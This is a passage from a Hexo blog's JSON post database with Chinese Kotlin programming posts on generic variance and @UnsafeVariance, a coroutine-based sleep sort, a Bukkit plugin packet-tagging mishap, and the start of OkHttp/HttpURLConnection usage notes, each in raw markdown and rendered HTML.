class=\"token operator\">:</span> <span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">interface</span> Transformer<span class=\"token operator\">&lt;</span><span class=\"token keyword\">in</span> T<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> trans <span class=\"token operator\">=</span> <span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Person<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>t<span class=\"token operator\">:</span> Person<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> t<span class=\"token punctuation\">.</span>name\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 如果不声明逆变 这行代码无法通过编译</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">handleTransformer</span><span class=\"token punctuation\">(</span>trans<span class=\"token operator\">:</span> Transformer<span class=\"token operator\">&lt;</span>Student<span class=\"token operator\">></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> student <span class=\"token operator\">=</span> <span class=\"token function\">Student</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Tom\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> trans<span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>student<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"UnsafeVariance注解\"><a href=\"#UnsafeVariance注解\" class=\"headerlink\" title=\"@UnsafeVariance注解\"></a>@UnsafeVariance注解</h2><p>在你违反了协变&#x2F;逆变的约定时，可以使用这个注解让编译通过</p>\n<p>但正如它的字面意思，<strong>它不安全</strong></p>\n<p>在迫不得已要使用它的情况下，你必须清楚你在做什么</p>\n<h3 id=\"使用示例-1\"><a href=\"#使用示例-1\" class=\"headerlink\" title=\"使用示例\"></a>使用示例</h3><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> Data<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> T<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span><span class=\"token operator\">:</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token comment\">// 不合法，因为外部可以访问并修改这个变量</span>\n    <span class=\"token comment\">// 使用@UnsafeVariance注解，编译通过</span>\n    <span class=\"token keyword\">var</span> value<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，外部无法访问这个变量</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">var</span> value2<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">// 合法，因为这是常量，常量值无法被修改</span>\n    <span class=\"token keyword\">val</span> value3<span class=\"token operator\">:</span> T <span class=\"token operator\">=</span> <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\">// 不合法，因为协变规定了不能在方法参数中使用泛型</span>\n    <span class=\"token comment\">// 使用@UnsafeVariance注解，编译通过</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>input<span class=\"token operator\">:</span> <span class=\"token annotation builtin\">@UnsafeVariance</span> T<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 这样做是合法的，方法的返回值可以使用泛型</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> T <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">TODO</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n"},{"title":"用kotlin协程实现了睡眠排序","date":"2021-10-18T03:45:28.000Z","author":"寒雨","hide":false,"summary":"用Kotlin实现了睡眠排序","_content":"\n# 用kotlin协程实现了睡眠排序\n\n```kotlin\n// 睡眠排序 kotlin实现\n// 需要用到协程库\n// kt用多线程写多没意思\nfun sleepSort(array: Array<Int?>): List<Int?> {\n    val result = arrayListOf<Int>()\n    val list = arrayListOf<Deferred<Unit>>()\n    for (i in array) {\n        list.add(GlobalScope.async {\n            delay(i!! * 10L)\n            result.add(i)\n            Unit\n        })\n    }\n    // 堵塞至操作完成\n    runBlocking {\n        list.forEach {\n            it.await()\n        }\n    }\n    return result\n}\n```\n\n","source":"_posts/kotlin-sleep-sort.md","raw":"---\ntitle: 用kotlin协程实现了睡眠排序\ndate: 2021-10-18 11:45:28\nauthor: 寒雨\nhide: false\nsummary: 用Kotlin实现了睡眠排序\ncategories: 杂谈\ntags:\n  - Kotlin\n  - Coroutine\n  - 算法\n---\n\n# 用kotlin协程实现了睡眠排序\n\n```kotlin\n// 睡眠排序 kotlin实现\n// 需要用到协程库\n// kt用多线程写多没意思\nfun sleepSort(array: Array<Int?>): List<Int?> {\n    val result = arrayListOf<Int>()\n    val list = arrayListOf<Deferred<Unit>>()\n    for (i in array) {\n        list.add(GlobalScope.async {\n            delay(i!! * 10L)\n            result.add(i)\n            Unit\n        })\n    }\n    // 堵塞至操作完成\n    runBlocking {\n        list.forEach {\n            it.await()\n        }\n    }\n    return result\n}\n```\n\n","slug":"kotlin-sleep-sort","published":1,"updated":"2021-11-19T09:36:06.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtp001wsfkl246n0xu0","content":"<h1 id=\"用kotlin协程实现了睡眠排序\"><a href=\"#用kotlin协程实现了睡眠排序\" class=\"headerlink\" title=\"用kotlin协程实现了睡眠排序\"></a>用kotlin协程实现了睡眠排序</h1><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 睡眠排序 kotlin实现</span>\n<span class=\"token comment\">// 需要用到协程库</span>\n<span class=\"token comment\">// kt用多线程写多没意思</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">sleepSort</span><span class=\"token punctuation\">(</span>array<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Deferred<span class=\"token operator\">&lt;</span>Unit<span class=\"token operator\">&gt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token keyword\">in</span> array<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>GlobalScope<span class=\"token punctuation\">.</span><span class=\"token function\">async</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">delay</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">!!</span> <span class=\"token operator\">*</span> <span class=\"token number\">10L</span><span class=\"token punctuation\">)</span>\n            result<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n            Unit\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">// 堵塞至操作完成</span>\n    runBlocking <span class=\"token punctuation\">{</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> result\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"用kotlin协程实现了睡眠排序\"><a href=\"#用kotlin协程实现了睡眠排序\" class=\"headerlink\" title=\"用kotlin协程实现了睡眠排序\"></a>用kotlin协程实现了睡眠排序</h1><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 睡眠排序 kotlin实现</span>\n<span class=\"token comment\">// 需要用到协程库</span>\n<span class=\"token comment\">// kt用多线程写多没意思</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">sleepSort</span><span class=\"token punctuation\">(</span>array<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">?</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> result <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Int<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> list <span class=\"token operator\">=</span> arrayListOf<span class=\"token operator\">&lt;</span>Deferred<span class=\"token operator\">&lt;</span>Unit<span class=\"token operator\">></span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token keyword\">in</span> array<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>GlobalScope<span class=\"token punctuation\">.</span><span class=\"token function\">async</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">delay</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">!!</span> <span class=\"token operator\">*</span> <span class=\"token number\">10L</span><span class=\"token punctuation\">)</span>\n            result<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n            Unit\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// 堵塞至操作完成</span>\n    runBlocking <span class=\"token punctuation\">&#123;</span>\n        list<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> result\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n"},{"title":"NMS蛋疼的非法包检测","date":"2021-07-18T09:07:39.000Z","author":"寒雨","hide":false,"summary":"尝试利用继承NMS包来对数据包进行标识，结果出人意料","_content":"故事起因大概是这样的...\n昨天我需要做一个拦截本插件以外所有Actionbar信息的功能\n最开始我自然而然的想到了监听**PacketPlayOutChat**数据包，通过判断它的内容是否符合条件来辨别这个Actionbar是否为我插件发送的Actionbar信息\n**但这样实在是太low了**，我不喜欢利用其发送的文本内容进行判断。就像做GUI，比起判断GUI的title，当然是判断InventoryHolder的做法更好。\n于是我转向研究能否给这个数据包本身加上一个标记，进而方便我们辨识这个数据包\n于是我想到了让一个类继承PacketPlayOutChat，用这个类来发包的办法\n并且利用Taboolib的**ASMVersionControl**，还可以实现这个对这个类的版本控制\n只需要对监听到的数据包的类进行判断，便可以轻易辨别\n当时我想到的时候感觉自己真是牛逼坏了\n大致做法如下\n**继承PacketPlayOutChat**\n\n```kotlin\nclass LegalActionBarPacket(iChatBaseComponent: IChatBaseComponent, chatMessageType: ChatMessageType, uuid: UUID) : PacketPlayOutChat(iChatBaseComponent,chatMessageType,uuid)\n```\n**ASMVersionControl**\n\n```kotlin\nval legalPacketClass = AsmVersionControl.createNMS(\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\").mapping().translate(SacredHUD.plugin) \n```\n**数据包监听**\n\n```kotlin\n    @TPacket(type = TPacket.Type.SEND)\n    private fun send(player: Player, packet: Packet): Boolean {\n        if (packet.equals(\"PacketPlayOutChat\")\n                && packet.read(\"b\").reflex<Byte>(\"d\") == 2.toByte()\n                && packet.get().javaClass != legalPacketClass){\n            return false\n        }\n        return true\n    }\n```\n\n然后我洋洋得意的编译出来扔进服务器里，对自己发了一个legalPacket\n可笑的是，这个我取名的legalPacket，被服务端认为是一个ilegal packet，我直接掉线\n","source":"_posts/nms-packet-name-check.md","raw":"---\ntitle: NMS蛋疼的非法包检测\ndate: 2021-07-18 17:07:39\nauthor: 寒雨\nhide: false\nsummary: 尝试利用继承NMS包来对数据包进行标识，结果出人意料\ncategories: 杂谈\ntags:\n  - Bukkit\n  - Kotlin\n  - TabooLib\n---\n故事起因大概是这样的...\n昨天我需要做一个拦截本插件以外所有Actionbar信息的功能\n最开始我自然而然的想到了监听**PacketPlayOutChat**数据包，通过判断它的内容是否符合条件来辨别这个Actionbar是否为我插件发送的Actionbar信息\n**但这样实在是太low了**，我不喜欢利用其发送的文本内容进行判断。就像做GUI，比起判断GUI的title，当然是判断InventoryHolder的做法更好。\n于是我转向研究能否给这个数据包本身加上一个标记，进而方便我们辨识这个数据包\n于是我想到了让一个类继承PacketPlayOutChat，用这个类来发包的办法\n并且利用Taboolib的**ASMVersionControl**，还可以实现这个对这个类的版本控制\n只需要对监听到的数据包的类进行判断，便可以轻易辨别\n当时我想到的时候感觉自己真是牛逼坏了\n大致做法如下\n**继承PacketPlayOutChat**\n\n```kotlin\nclass LegalActionBarPacket(iChatBaseComponent: IChatBaseComponent, chatMessageType: ChatMessageType, uuid: UUID) : PacketPlayOutChat(iChatBaseComponent,chatMessageType,uuid)\n```\n**ASMVersionControl**\n\n```kotlin\nval legalPacketClass = AsmVersionControl.createNMS(\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\").mapping().translate(SacredHUD.plugin) \n```\n**数据包监听**\n\n```kotlin\n    @TPacket(type = TPacket.Type.SEND)\n    private fun send(player: Player, packet: Packet): Boolean {\n        if (packet.equals(\"PacketPlayOutChat\")\n                && packet.read(\"b\").reflex<Byte>(\"d\") == 2.toByte()\n                && packet.get().javaClass != legalPacketClass){\n            return false\n        }\n        return true\n    }\n```\n\n然后我洋洋得意的编译出来扔进服务器里，对自己发了一个legalPacket\n可笑的是，这个我取名的legalPacket，被服务端认为是一个ilegal packet，我直接掉线\n","slug":"nms-packet-name-check","published":1,"updated":"2022-12-12T15:52:28.637Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtq001zsfklcm6g2vie","content":"<p>故事起因大概是这样的…<br>昨天我需要做一个拦截本插件以外所有Actionbar信息的功能<br>最开始我自然而然的想到了监听<strong>PacketPlayOutChat</strong>数据包，通过判断它的内容是否符合条件来辨别这个Actionbar是否为我插件发送的Actionbar信息<br><strong>但这样实在是太low了</strong>，我不喜欢利用其发送的文本内容进行判断。就像做GUI，比起判断GUI的title，当然是判断InventoryHolder的做法更好。<br>于是我转向研究能否给这个数据包本身加上一个标记，进而方便我们辨识这个数据包<br>于是我想到了让一个类继承PacketPlayOutChat，用这个类来发包的办法<br>并且利用Taboolib的<strong>ASMVersionControl</strong>，还可以实现这个对这个类的版本控制<br>只需要对监听到的数据包的类进行判断，便可以轻易辨别<br>当时我想到的时候感觉自己真是牛逼坏了<br>大致做法如下<br><strong>继承PacketPlayOutChat</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">LegalActionBarPacket</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token operator\">:</span> IChatBaseComponent<span class=\"token punctuation\">,</span> chatMessageType<span class=\"token operator\">:</span> ChatMessageType<span class=\"token punctuation\">,</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">PacketPlayOutChat</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token punctuation\">,</span>chatMessageType<span class=\"token punctuation\">,</span>uuid<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong>ASMVersionControl</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> legalPacketClass <span class=\"token operator\">=</span> AsmVersionControl<span class=\"token punctuation\">.</span><span class=\"token function\">createNMS</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>SacredHUD<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong>数据包监听</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@TPacket</span><span class=\"token punctuation\">(</span>type <span class=\"token operator\">=</span> TPacket<span class=\"token punctuation\">.</span>Type<span class=\"token punctuation\">.</span>SEND<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> packet<span class=\"token operator\">:</span> Packet<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PacketPlayOutChat\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reflex<span class=\"token operator\">&lt;</span>Byte<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">.</span><span class=\"token function\">toByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>javaClass <span class=\"token operator\">!=</span> legalPacketClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后我洋洋得意的编译出来扔进服务器里，对自己发了一个legalPacket<br>可笑的是，这个我取名的legalPacket，被服务端认为是一个ilegal packet，我直接掉线</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<p>故事起因大概是这样的…<br>昨天我需要做一个拦截本插件以外所有Actionbar信息的功能<br>最开始我自然而然的想到了监听<strong>PacketPlayOutChat</strong>数据包，通过判断它的内容是否符合条件来辨别这个Actionbar是否为我插件发送的Actionbar信息<br><strong>但这样实在是太low了</strong>，我不喜欢利用其发送的文本内容进行判断。就像做GUI，比起判断GUI的title，当然是判断InventoryHolder的做法更好。<br>于是我转向研究能否给这个数据包本身加上一个标记，进而方便我们辨识这个数据包<br>于是我想到了让一个类继承PacketPlayOutChat，用这个类来发包的办法<br>并且利用Taboolib的<strong>ASMVersionControl</strong>，还可以实现这个对这个类的版本控制<br>只需要对监听到的数据包的类进行判断，便可以轻易辨别<br>当时我想到的时候感觉自己真是牛逼坏了<br>大致做法如下<br><strong>继承PacketPlayOutChat</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">LegalActionBarPacket</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token operator\">:</span> IChatBaseComponent<span class=\"token punctuation\">,</span> chatMessageType<span class=\"token operator\">:</span> ChatMessageType<span class=\"token punctuation\">,</span> uuid<span class=\"token operator\">:</span> UUID<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">PacketPlayOutChat</span><span class=\"token punctuation\">(</span>iChatBaseComponent<span class=\"token punctuation\">,</span>chatMessageType<span class=\"token punctuation\">,</span>uuid<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong>ASMVersionControl</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> legalPacketClass <span class=\"token operator\">=</span> AsmVersionControl<span class=\"token punctuation\">.</span><span class=\"token function\">createNMS</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"me.asgard.coldrain.hud.module.nms.LegalActionBarPacket\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">translate</span><span class=\"token punctuation\">(</span>SacredHUD<span class=\"token punctuation\">.</span>plugin<span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><strong>数据包监听</strong></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token annotation builtin\">@TPacket</span><span class=\"token punctuation\">(</span>type <span class=\"token operator\">=</span> TPacket<span class=\"token punctuation\">.</span>Type<span class=\"token punctuation\">.</span>SEND<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">send</span><span class=\"token punctuation\">(</span>player<span class=\"token operator\">:</span> Player<span class=\"token punctuation\">,</span> packet<span class=\"token operator\">:</span> Packet<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Boolean <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>packet<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PacketPlayOutChat\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>reflex<span class=\"token operator\">&lt;</span>Byte<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"d\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">.</span><span class=\"token function\">toByte</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token operator\">&amp;&amp;</span> packet<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>javaClass <span class=\"token operator\">!=</span> legalPacketClass<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后我洋洋得意的编译出来扔进服务器里，对自己发了一个legalPacket<br>可笑的是，这个我取名的legalPacket，被服务端认为是一个ilegal packet，我直接掉线</p>\n"},{"title":"OKHttp/HttpURLConnection使用笔记","date":"2021-11-13T16:00:00.000Z","author":"寒雨","hide":false,"summary":"OKHttp/HttpURLConnection使用笔记","_content":"\n# OKHttp/HttpURLConnection使用笔记\n\n废话不多说，上代码\n\n~~~kotlin\n    // 使用OKHttp提交数据\n    private fun okHttpPost() {\n        coroutineScope.launch(Dispatchers.IO) {\n            val requestBody = FormBody.Builder()\n                .add(\"user\", \"admin\")\n                .add(\"password\", \"123456\")\n                .build()\n            val request = Request.Builder()\n                .url(\"https://www.baidu.com\")\n                .post(requestBody)\n                .build()\n            // 之后操作跟拉取数据一样\n        }\n    }\n\n    // 使用OKHttp拉取数据\n    // 比HttpUrlConnection好使多了\n    private fun okHttpPull() {\n        coroutineScope.launch(Dispatchers.IO) {\n            try {\n                val client = OkHttpClient()\n                val request = Request.Builder()\n                    .url(\"https://www.baidu.com\")\n                    .build()\n                val response = client.newCall(request).execute()\n                val data = response.body?.string()\n                if (data != null) {\n                    withContext(Dispatchers.Main) {\n                        binding.responseText.text = data\n                    }\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            }\n        }\n    }\n\n    // 使用HttpURLConnection提交数据\n    private fun httpUrlConnectionPost() {\n        val connection: HttpURLConnection? = null\n        // 网络请求操作 拿到connection\n        connection!!.requestMethod = \"POST\"\n        val output = DataOutputStream(connection.outputStream)\n        output.writeBytes(\"username=admin&password=123456\")\n    }\n\n    // 使用HttpURLConnection拉取数据\n    private fun httpUrlConnectionPull() {\n        // 即使使用协程，网络操作也不能在主线程上运行，需要使用Dispatchers.IO\n        coroutineScope.launch(Dispatchers.IO) {\n            var connection: HttpURLConnection? = null\n            try {\n                val response = StringBuilder()\n                val url = 